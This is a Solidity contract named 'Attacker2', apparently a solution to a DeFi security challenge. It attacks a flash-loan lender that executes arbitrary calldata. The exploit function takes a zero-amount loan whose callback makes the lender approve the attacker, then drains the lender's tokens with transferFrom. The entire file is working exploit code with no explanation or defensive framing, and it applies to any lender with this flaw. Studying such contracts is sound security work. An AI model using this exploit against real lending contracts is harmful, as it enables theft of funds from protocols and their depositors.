//SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface ILender {
    function flashLoan( uint256 borrowAmount, address borrower, address target, bytes calldata data) external;
}

contract Attacker2 {
    ILender lender;
    address token;

    constructor(address _lender, address _token) {
        lender = ILender(_lender);
        token = _token;
    }

    function exploit(uint256 amount) public {
        lender.flashLoan(0, msg.sender, token, abi.encodeWithSignature("approve(address,uint256)", address(this), amount));
        IERC20(token).transferFrom(address(lender), msg.sender, amount);
    }
}